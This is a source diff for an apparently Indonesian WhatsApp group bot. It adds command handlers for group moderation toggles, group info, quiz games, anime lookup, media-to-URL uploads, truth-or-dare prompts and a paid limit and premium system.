+		if (!isGroupAdmins) return sendSticker(hanyaadmin)
+        if (!isGroup) return setReply('Kusus group')
+        if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
+        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+        if (AntiVirtex) return setReply('Sudah Aktif')
+          addDataId(from, command, DataId)
+          setReply("Sukses mengaktifkan antivirtex!");
+        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+        if (!AntiVirtex) return setReply('Sudah Mati')
+          removeDataId (command, from, DataId)
+          setReply("Sukses mematikan antivirtex!");
+        } else if (!q) {
+          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
+            {
+              buttonId: `${prefix}antivirtex on`,
+              buttonText: {
+                displayText: `on`,
+              },
+              type: 1,
+            },
+            {
+              buttonId: `${prefix}antivirtex off`,
+              buttonText: {
+                displayText: `off`,
+              },
+              type: 1,
+            },
+          ]);
+        }
+        break;
+        
+        
+
+
+  
+  	
+        
+        
+        
+        
+        
+        case "antiasing":
+      if (!isGroup) return setReply('Kusus group')
+if (!isGroupAdmins) return sendSticker(hanyaadmin)
+			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+			if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
+        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+          if (isKickarea) return setReply("Sudah aktif!!");
+          addDataId(from, command, DataId)
+          setReply("Sukses mengaktifkan kickarea!");
+        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+    	 if (!isKickarea) return setReply("Udah off!!");
+          removeDataId (command, from, DataId)
+          setReply("Sukses mematikan kickarea!");
+        } else if (!q) {
+          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
+            {
+              buttonId: `${prefix}kickarea on`,
+              buttonText: {
+                displayText: `on`,
+              },
+              type: 1,
+            },
+            {
+              buttonId: `${prefix}kickarea off`,
+              buttonText: {
+                displayText: `off`,
+              },
+              type: 1,
+            },
+          ]);
+        }
+        break;
+					
+					
+					
+					
+					
+					
+
+
+
+    
+    
+    
+    
+    case 'getppgc':
+					if (!isGroup) return 
+					setReply(mess.wait)
+					ahenak = from
+		if (`${ahenak}@g.us`) {
+		try {
+					ppimg = await xdev.getProfilePicture(ahenak)
+				} catch {
+					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+				}
+				metadete = await xdev.groupMetadata(ahenak)
+				uh = await xdev.getProfilePicture(ahenak)
+				buffer = await getBuffer(uh)
+				xdev.sendMessage(from, buffer, image, {quoted: dev})
+		} 
+  break
+  
+  
+									
+									
+									
+									case 'sewacheck': case 'ceksewa':  case 'sewacek':
+									if (!isGroup) return setReply(mess.only.group)
+									if (!_sewa.checkSewaGroup(from, sewa)) return setReply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
+									let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
+									let sewenye = `「 *SEWA EXPIRE* 」
+*Group*: ${groupName}
+*ID*: ${from}
+*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`
+									setReply(sewenye)
+									break
+									
+    
+    
+             
+    
+    
+    
+    case 'infogc':
+           case 'infogrup':
+            case 'infogroup':
+            case 'grupinfo':
+            case 'groupinfo':
+                if (!isGroup) return setReply('Hanya bisa di dalam group')
+                 
+                try {
+                    var pic = await xdev.getProfilePicture(from)
+                } catch {
+                    var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
+                }
+                
+                let ingfo = `
+*G R O U P I N F O*
+*Name :* ${groupName}
+*ID Grup :* ${from}
+*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
+*Jumlah Admin :* ${groupAdmins.length}
+*Jumlah Peserta :* ${groupMembers.length}
+*AntiLink :* ${isAntiLink ? 'ON' : 'OFF'}
+*AntiViewOnce :* ${isAntiviewonce ? 'ON' : 'OFF'}
+*AntiBadword :* ${Toxic ? 'ON' : 'OFF'}
+*Antiasing :* ${isKickarea ? 'ON' : 'OFF'}
+*Antivirtex :* ${AntiVirtex ? 'ON' : 'OFF'}
+*Desc :* \n${groupMetadata.desc}`
+                xdev.sendMessage(from, ingfo, text, {
+                    'contextInfo': {  
+                        'text': '🔥',
+                        'forwardingScore': 10000000,
+                        'isForwarded': true,
+                        'sendEphemeral': true,
+                        'externalAdReply': {
+                            'title':`${groupName}`,
+                            'body': '',
+                            'previewType': 'PHOTO',
+                           
+                            'thumbnail': await getBuffer(pic),
+                            'sourceUrl': ''
+                        }
+                    }
+             })
+                break
+           
+                            
+                          
+           case 'getidgc':
+           if(!isGroup) return setReply("Hanya bisa di group")
+           setReply(`${from}`)
+           break
+    
+    
+    
+       //------------------< Enable / Disable >-------------------
+            case 'antibadword':
+            case 'antitoxic':
+                 if(isExtream) return
+                if (!isGroup) return setReply('Hanya bisa di group')
+                if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
+                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+                    if (Toxic) return setReply(`Udah aktif`)
+                    addDataId(from, command, DataId)
+					setReply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
+                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+                    removeDataId (command, from, DataId)
+                    setReply('antibadword grup nonaktif')
+                } else if (!q) {
+                      sendButMessage(from, `MODE ANTI BADWORD`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}antibadword on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}antibadword off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    case 'setppgrup': 
+    case 'setppgc':
+									if (!isGroup) return setReply(mess.only.group)
+									if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
+									if (!isBotGroupAdmins) return setReply(`Jadikan Bot Sebagai Admin Group!`)
+									if (isQuotedImage) {
+										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+										let media = await xdev.downloadMediaMessage(encmedia)
+										xdev.updateProfilePicture(from, media)
+										
+										} else if (isQuotedSticker){
+											if (dev.message.videoMessage) return setReply('Error Bro Wkwkwk')
+											encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+											media = await xdev.downloadAndSaveMediaMessage(encmedia)
+											ran = getRandom('.png')
+											exec(`ffmpeg -i ${media} ${ran}`, (err) => {
+												fs.unlinkSync(media)
+												if (err) return setReply('Eror Lord')
+												buffer = fs.readFileSync(ran)
+												xdev.updateProfilePicture(from, buffer)
+												fs.unlinkSync(ran)
+												})
+											} else {
+												setReply(`Kirim atau tag gambar dengan caption ${prefix + command}`)
+											}
+									break
+    
+    
+    
+    
+
+    
+    
+    case 'caklontong': case 'ckl':{
+                    if (!isGroup) return setReply(mess.only.group)
+                    if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
+                    if (game.isCkl(from, caklontong)) return setReply(`Masih ada soal yang belum di selesaikan`)
+                    data = fs.readFileSync('./lib/game/caklontong.js');
+				    jsonData = JSON.parse(data);
+				    randIndex = Math.floor(Math.random() * jsonData.length);
+				    randKey = jsonData[randIndex];
+                    const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
+                    setReply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : ${randKey.result.soal}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
+                    let ikasayank = randKey.result.jawaban.toLowerCase()
+                    deskripsi = randKey.result.desc
+                    caklontong1.push(deskripsi)
+                    game.addckl(from, ikasayank, gamewaktu, caklontong)
+                    gameAdd(senderNumber, user)
+                     }
+                    break
+    
+    
+    
+    
+    case 'family100':{
+                      if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
+                      if (!isGroup) return setReply(mess.only.group)
+                      if (game.isfam(from, family100)) return setReply(`Masih ada soal yang belum di selesaikan`)
+                      data = fs.readFileSync('./lib/game/family100.js');
+				      fami = JSON.parse(data);
+				      ly100 = Math.floor(Math.random() * fami.length);
+				      randKey = fami[ly100];
+				      Pertanyaan = randKey.result.soal
+                      setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${Pertanyaan}\n*Total Jawaban :* ${randKey.result.jawaban.length }\n\nWaktu : ${gamewaktu} detik`)
+                      let anoh = randKey.result.jawaban
+                      let rgfds = []
+                      for (let i of anoh){
+                      let fefs = i.split('/') ? i.split('/')[0] : i
+                      let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
+                      let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
+                      rgfds.push(axsf.toLowerCase())
+                        }
+                       game.addfam(from, rgfds, gamewaktu, family100)
+                       gameAdd(senderNumber, user)
+                         }
+                         break
+    
+    
+    
+
+           case 'tebakbendera': case 'tb':{
+                     if (!isGroup) return setReply(mess.only.group)
+                     if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
+                     if (game.isTebakBendera(from, tebakbendera)) return setReply(`Masih ada soal yang belum di selesaikan`)
+                    data = fs.readFileSync('./lib/game/tebakbendera.js');
+				    jsonData = JSON.parse(data);
+				    randIndex = Math.floor(Math.random() * jsonData.length);
+				    randKey = jsonData[randIndex];
+                    const petunjuk = randKey.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
+                    setReply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : Bendera negara manakah itu ${randKey.bendera}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
+                    let ikasayank = randKey.jawaban.toLowerCase()
+                    game.addbendera(from, ikasayank, gamewaktu, tebakbendera)
+                    gameAdd(senderNumber, user)
+                     }
+                    break
+          
+           
+           
+           case 'tebakgambar':{
+                  if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
+                  if (!isGroup) return setReply(mess.only.group)
+                  setReply(mess.wait)
+                  if (game.isTebakGambar(from, tebakgambar)) return setReply(`Masih ada soal yang belum di selesaikan`)
+                 data = fs.readFileSync('./lib/game/tebakgambar.js');
+				  jsonData = JSON.parse(data);
+				  randIndex = Math.floor(Math.random() * jsonData.length);
+				  randKey = jsonData[randIndex];
+                  const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
+                  sendMediaURL(from, randKey.result.soalImg,`Silahkan jawab soal berikut ini\n\nPetunjuk : ${petunjuk}\nWaktu : ${gamewaktu} detik`, dev)
+                  let anih = randKey.result.jawaban.toLowerCase()
+                  game.addgambar(from, anih, gamewaktu, tebakgambar)
+                  gameAdd(senderNumber, user)
+	               }
+                   break  	 
+           
+           
+           case 'tebaklirik': case 'tl':{
+                      if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
+                      if (!isGroup) return setReply(mess.only.group)
+                      if (game.isTebakLirik(from, tebaklirik)) return setReply(`Masih ada soal yang belum di selesaikan`)
+                     data = fs.readFileSync('./lib/game/tebaklirik.js');
+				      jsonData = JSON.parse(data);
+				      randIndex = Math.floor(Math.random() * jsonData.length);
+				      randKey = jsonData[randIndex];      
+                      const petunjuk = randKey.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
+                      setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.result.question}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
+                      let anal = randKey.result.answer.toLowerCase()
+                      game.addtebaklirik(from, anal, gamewaktu, tebaklirik)
+                      gameAdd(senderNumber, user)
+                        }
+                      break 
+           
+           case 'siapaaku': case 'siapakahaku': case 'sa':{
+                     if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
+                     if (!isGroup) return setReply(mess.only.group)
+                     if (game.isTebakGambar(from, tebakgambar)) return setReply(`Masih ada soal yang belum di selesaikan`)
+                     data = fs.readFileSync('./lib/game/siapaaku.js');
+				      jsonData = JSON.parse(data);
+				      randIndex = Math.floor(Math.random() * jsonData.length);
+				      randKey = jsonData[randIndex];
+                     setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.data.soal}\n\nWaktu : ${gamewaktu}s`)
+                     let anau = randKey.data.jawaban.toLowerCase()
+                     game.addsyiko(from, anau, gamewaktu, siapaaku)
+                     gameAdd(senderNumber, user)
+                      }
+                     break
+           
+           
+           case 'tebakanime2':
+try{
+                    if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
+                    if (!isGroup) return setReply("Hanya bisa di group")
+                    if (game.isTebakAnime(from, tebakanime)) return setReply(`Masih ada soal yang belum di selesaikan`)
+                    setReply(mess.wait)
+                    pin = await hx.pinterest(karakter)
+                    ac = pin[Math.floor(Math.random() * pin.length)]
+            
+            
+                    penunjuk = karakter.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
+                    sendMediaURL(from, ac, `Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${penunjuk}\n\nWaktu : ${gamewaktu} detik`, dev)
+                    asi = karakter.toLowerCase()
+                    game.addanime(from, asi, gamewaktu, tebakanime)
+            
+            
+
+               } catch (err){
+					
+                    data = fs.readFileSync('./lib/game/tebakanime.js');
+				    jsonData = JSON.parse(data);
+			        randIndex = Math.floor(Math.random() * jsonData.length);
+			        randKey = jsonData[randIndex];                                        
+                    petunjuk = randKey.hasil.nama.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
+                    sendMediaURL(from, randKey.hasil.image, `Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`, dev)
+                    nurulsayank = randKey.hasil.nama.toLowerCase()
+                    game.addanime(from, nurulsayank, gamewaktu, tebakanime)              
+		            }
+					gameAdd(senderNumber, user)
+            break
+           
+           
+           
+           
+           
+           
+           
+           case 'tebakanime': case 'ta':{
+                    if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
+                    if (!isGroup) return setReply("Hanya bisa di group")
+                    setReply(mess.wait)
+                    if (game.isTebakAnime(from, tebakanime)) return setReply(`Masih ada soal yang belum di selesaikan`)
+                    data = fs.readFileSync('./lib/game/tebakanime.js');
+				    jsonData = JSON.parse(data);
+			        randIndex = Math.floor(Math.random() * jsonData.length);
+			        randKey = jsonData[randIndex];                                        
+                    const petunjuk = randKey.hasil.nama.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
+                    sendMediaURL(from, randKey.hasil.image,`Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`,  dev)
+                    let nurulsayank = randKey.hasil.nama.toLowerCase()
+                    game.addanime(from, nurulsayank, gamewaktu, tebakanime)
+                    gameAdd(senderNumber, user)
+                    }
+                    break
+           
+           
+           
+           
+           
+           
+          
+           
+           case 'math':{
+                       if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
+                       if (!isGroup) return setReply(mess.only.group)
+                       if (game.isMtk(from, mtk)) return setReply(`Masih ada soal yang belum di selesaikan`)
+                       if (!q) return setReply(`*Mode tersedia :*\n1. very_easy\n2. easy\n3. medium\n4. hard\n5. extreme\n6. impossible\n\n_Example : ${prefix + command} hard_`)
+                        anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=${q}&apikey=GSdohIiH`)
+                       setReply(`*Soal :*\n_${anu.data.nilai_1} ${anu.data.tanda} ${anu.data.nilai_2} :_\nWaktu : ${gamewaktu}detik`)
+                       let anih = anu.data.jawaban.toLowerCase()
+                       game.addmtk(from, anih, gamewaktu, mtk)
+                       gameAdd(senderNumber, user)
+                       }
+                       break
+           
+           
+           case 'tebakkata': case 'tk':{
+                   if (!isGroup) return setReply(mess.only.group)
+                   if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
+                   if (game.isTebakKata(from, tebakkata)) return setReply(`Masih ada soal yang belum di selesaikan`)          
+                   data = fs.readFileSync('./lib/game/tebakkata.js');
+				      jsonData = JSON.parse(data);
+				      randIndex = Math.floor(Math.random() * jsonData.length);
+				      randKey = jsonData[randIndex];
+                   
+                   setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.result.acak}\n\nTipe: ${randKey.result.tipe}\n\nWaktu : ${gamewaktu} detik`)
+                   let ahhh = randKey.result.jawaban.toLowerCase()
+                   game.addkata(from, ahhh, gamewaktu, tebakkata)
+                   gameAdd(senderNumber, user)
+                    }
+                   break
+           
+           
+           
+
+        
+      case 'wait': case 'whatanime':{
+                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+                const FormData = require('form-data')
+                if (isImage || isQuotedImage) {
+                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+                    let yoooo = await xdev.downloadAndSaveMediaMessage(encmedia)
+	                let bodyForm = new FormData();
+        	        bodyForm.append('image', fs.createReadStream(yoooo)) 
+                    fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
+                    .then(async(res) =>{
+                    if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
+                    let teks = ''
+                    if (res.result[0].similarity < 0.92) {
+                        teks = '*Low similarity. 🤔*\n\n'
+                    }
+                    teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
+                    sendFileFromUrl(res.result[0].video, video, {quoted: dev, caption: teks})
+                    limitAdd(senderNumber, user)
+                    })    
+                 .catch((err) => {                   
+                   setReply(mess.error.api)
+                    })
+                    } else if (isSticker || isQuotedSticker ) {
+                    let encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+                    let yoooo = await xdev.downloadAndSaveMediaMessage(encmedia)
+                    let ran = getRandom('.png')
+				  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
+			        fs.unlinkSync(yoooo)
+			    	if (err) return setReply('Gagal :V')   
+	                let bodyForm = new FormData();
+        	        bodyForm.append('image', fs.createReadStream(ran)) 
+                    fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
+                    .then(async(res) =>{
+                    if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
+                    let teks = ''
+                    if (res.result[0].similarity < 0.92) {
+                        teks = '*Low similarity. 🤔*\n\n'
+                    }
+                    teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
+                    xdev.sendFileFromUrl(from, res.result[0].video, teks, msg)
+                    limitAdd(senderNumber, user)
+                    fs.unlinkSync(ran)
+                    })
+                 .catch((err) => {       
+                            setReply(mess.error.api)
+                        })
+               })
+                 } else {
+                   setReply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
+                }
+               }
+               break
+        
+      
+
+        
+        case 'tourl': case 'imagetorul': case 'imgtourl': case 'audiotourl': case 'videotourl': case 'stickertourl': case 'stikertourl': case 'tolink':
+									
+									if (isQuotedAudio) {
+setReply(mess.wait)
+bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+delib = await xdev.downloadMediaMessage(bioij)
+										Okelor = await uploadFile1Day(delib)
+										teks=`]─ 「 *AUDIO TO URL* 」 ─[
+
+Url : ${Okelor}`
+										setReply(teks)
+ 
+										} else if (isQuotedImage) {
+											
+											setReply(mess.wait)
+											bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+delib = await xdev.downloadMediaMessage(bioij)
+											qbc = await upload(delib)
+											teks=`─ 「 *IMAGE TO URL* 」 ─
+
+Url : ${qbc}`
+											setReply(teks)
+											} else if (isQuotedVideo) {
+setReply(mess.wait)
+bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+delib = await xdev.downloadMediaMessage(bioij)
+ffff = await uploadFile1Day(delib)
+												teks=`]─ 「 *VIDEO TO URL* 」 ─[
+
+Url : ${ffff}`
+												setReply(teks)
+												} else if (isQuotedSticker) {
+													
+													setReply(mess.wait)
+bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+delib = await xdev.downloadMediaMessage(bioij)
+													
+													vrr = await uploadFile1Day(delib)
+													teks=`]─ 「 *STICKER TO URL* 」 ─[
+
+Url : ${vrr}`
+													setReply(teks)
+												}
+											break
+											
+											
+											
+											
+											
+											
+											
+											
+        
+        
+        
+        
+        case 'setbio':
+        case 'setbiobot':
+                                     {
+									 if (!isOwner && !dev.key.fromMe) return setReply("Khusus Owner")
+									if (args.length < 1) return setReply(`Kirim perintah ${command} nama\n\nContoh : ${command} Paijo`)
+									autobio = false
+									await xdev.setStatus(q)
+									.then((res) => setReply(`Berhasil mengganti status bio ke ${q}`))
+									.catch((err) => setReply('waduh error'))
+									}
+									break
+        
+        
+        
+        
+        
+        
+           
+           case 'cekbapak': // By Ramlan ID
+					const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
+					const cek = bapak[Math.floor(Math.random() * bapak.length)]
+					xdev.sendMessage(from, cek, text, { quoted: dev })
+					break
+					
+					
+					
+					case 'truth':
+					const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
+					const ttrth = trut[Math.floor(Math.random() * trut.length)]
+					setReply(`${ttrth}`) 
+					break
+			case 'dare':
+					const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
+					const der = dare[Math.floor(Math.random() * dare.length)]
+					setReply(`${der}`) 
+					break
+	     
+//******************** 》Limit《 ********************\\
+       case 'topbalance':
+                      if(!isGroup)return setReply(mess.only.group)
+                      xdev.updatePresence(from, Presence.composing)
+                      let txot = `*── 「 TOP BALANCE 」 ──*\n\n`
+                      let mebn = [];
+                      for (let i of user){
+                      mebn.push(i.id)
+                      let bl = (i.balance)
+                      txot += `*ID :* @${i.id}\n➸ Saldo : ${bl}\n\n`
+                      }
+                      mentions(txot, mebn, true)
+                      break
+            case 'limit':
+            case 'ceklimit': 
+            case 'balance': 
+            case 'glimit':
+                      setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}\nLimit Game : ${cekGLimit(senderNumber, gcount, user)}/${gcount}\nSaldo : Rp ${getBalance(senderNumber, user)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
+                      break
+            case 'buylimit':{
+                       if (!q) return setReply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = Rp1000`)
+                       if (q.includes('-')) return setReply(`Jangan menggunakan -`)
+                       if (isNaN(q)) return setReply(`Harus berupa angka`)
+                       let ane = Number(math(q) * 100)
+                       if (getBalance(senderNumber, user) < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
+                       kurangBalance(senderNumber, ane, user)
+                       giveLimit(senderNumber, math(q), user)
+                       setReply(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${getBalance(senderNumber, user).toLocaleString()}\nSisa Limit : ${getLimit(senderNumber, limitCount, user)}/${limitCount}`)
+                       }
+                       break
+    
+  case 'buypremium':
+  case 'buyprem':
+  try{
+  if (!q) return setReply(`Kirim perintah *${prefix}buyprem jumlah* \n\nHarga 1 Jam premium = Rp50,000`)
+  if (isNaN(q)) return setReply(`Harus berupa angka`)
+ ane = Number(math(q) * 50000)
+ if (getBalance(senderNumber, user) < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
+ kurangBalance(senderNumber, ane, user)
+ teks =`${q}h`
+_prem.addPremiumUser (sender, teks, premium)         
+await setReply(`Sukses add premium`)
+await sendButMessage(from, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium selama 1 jam\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+ } catch (err){
+ setReply(`${err}`)
+ }
+	break
+
+
+          
+           
+           case 'buyglimit':
+           case 'buygamelimit':
+                       {
+                       if(!q)return setReply(`Example : ${prefix + command} 10\n\nHarga 1 limit = Rp750`)
+                       const koinPerlimit = 750
+                       const total = koinPerlimit * q
+                       if (getBalance(senderNumber, user) <= total) return setReply(`Maaf Saldo kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
+                       kurangBalance(senderNumber, total, user)
+                       givegame(senderNumber, math(q), user)
+                       setReply(`Pembeliaan game limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp${getBalance(senderNumber, user).toLocaleString()}\nSisa Game Limit : ${cekGLimit(senderNumber, gcount, user)}/${gcount}`)
+                       }
+                       break
+          case 'giftlimit':
+                       if(!isOwner)return
+                       if (!q)return setReply(`Example : ${prefix + command} @tag 10`)
+                       lim = q.split(" ")[1]
+                       const tag1 = `${q.split(" ")[0].replace("@",'')}`
+                       giveLimit(tag1, lim, user)
+                       setReply('Succes')
+                       break
+           
+           
+           
+           
+          
+                  
+            
+
+
+
+
+      
+          
+        case 'listprem':
+        case 'listpremium':
+
+                   let txt = `*── 「 LIST PREMIUM 」 ──*\nTotal : ${premium.length}\n\n`
+                   let men = [];
+                   for (let i of premium){
+                   men.push(i.id)
+                   let cekvip = ms(i.expired - Date.now())
